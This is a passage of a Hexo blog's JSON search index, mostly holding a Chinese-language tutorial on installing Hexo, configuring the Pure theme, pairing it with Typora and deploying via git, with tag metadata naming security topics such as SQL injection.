待补充…","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"HEXO博客的搭建","slug":"HEXO博客的搭建","date":"2023-05-22T12:03:26.000Z","updated":"2023-05-25T02:29:02.249Z","comments":true,"path":"articles/2023/05/22/HEXO博客的搭建/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/22/HEXO%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/","excerpt":"","text":"安装HEXO和相关插件 hexo的安装 先安装node.js，地址：https://nodejs.org/en 安装完后安装Hexo： 1npm install hexo-cli -g 配置腾讯云节点： 12npm config set registry http://mirrors.cloud.tencent.com/npm/npm config get registry # 如果返回http://mirrors.cloud.tencent.com/npm/，说明镜像配置成功。 主题Pure以及配置 主题：https://github.com/cofess/hexo-theme-pure 先初始化一个文件夹，例如Blog： 1hexo init Blog 加载主题： 1git clone https://github.com/cofess/hexo-theme-pure.git themes/pure 更新主题： 12cd themes/puregit pull 配置（需要配置根目录config）：参考1，参考2，参考3，参考4 12language: zh-CN # 中文... 写文章 参考，没啥要讲的，指令：hexo n &quot;title&quot;，即可。 模板 模板在目录scaffolds里面，一般新建文件都会附上他的头，推荐头： 12345678title: HEXO博客的搭建toc: truesidebar: nonedate: 2023-05-22 20:03:26tags: [博客搭建]categories: [杂]descriptions: 本文介绍hexo搭建博客的心路历程typora-root-url: ..\\..\\.. 上面的typora-root-url很重要！下面说到。 设置分类 由于post文件夹里面的文章太多不好管理，那么只要我们分类一下即可。参考 配置： 12permalink: &#x27;articles/:year/:month/:day/:name/&#x27;new_post_name: &#x27;:year/:month/:title.md&#x27; Hexo与Typora协同 先设置一下图片目录：优先相对路径，自己设置，然后在文件头上蛇者上面的玩意。 解释：也就是，typora会将图片自动加载到一个文件夹里（它自己设置的），后面我们只需要设置根目录typora-root-url，让hexo能链接到即可！ 参考 404转发 https://hexo-next.readthedocs.io/zh_CN/latest/hexo/advanced/404页面/ 常用指令 123456hexo cleanhexo ghexo d # 推送 或者一起：hugo g -dhexo s # 本地测试hexo n &#x27;title&#x27; 推送hexo d 安装npm install hexo-deployer-git --save 然后配置： 12345deploy: type: git repo: &lt;repository url&gt; #https://bitbucket.org/JohnSmith/johnsmith.bitbucket.io branch: [branch] message: [message] 参考：https://hexo.io/zh-cn/docs/one-command-deployment.html 一些问题 Spawn failed https://blog.csdn.net/Kevin_Carpricron/article/details/124069885 组件推荐 文章加密 https://blog.51cto.com/u_15719567/5476056 代码块魔改 http://blog.iwwee.com/posts/hexo-optimize.html 关于复制代码的那一块参考下面的： https://kangaroohy.com/tools/hexo-theme-pure-optimize.html 评论系统开启 https://valine.js.org/quickstart.html Markdown标题头 https://www.npmjs.com/package/hexo-heading-index 博客优化 npm install hexo-neat --save https://github.com/cofess/hexo-theme-pure/blob/master/README.cn.md 优秀的搭建站点 https://hwame.top/20200520/hello-hexo-configuration.html https://tianbiao.top/29-pure主题配置/index.html 效果","categories":[{"name":"杂","slug":"杂","permalink":"https://j3f5.github.io/categories/%E6%9D%82/"}],"tags":[{"name":"博客搭建","slug":"博客搭建","permalink":"https://j3f5.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"}]}],"categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"},{"name":"杂","slug":"杂","permalink":"https://j3f5.github.io/categories/%E6%9D%82/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"https://j3f5.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"破解","slug":"破解","permalink":"https://j3f5.github.io/tags/%E7%A0%B4%E8%A7%A3/"},{"name":"sql注入","slug":"sql注入","permalink":"https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"博客搭建","slug":"博客搭建","permalink":"https://j3f5.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"}]}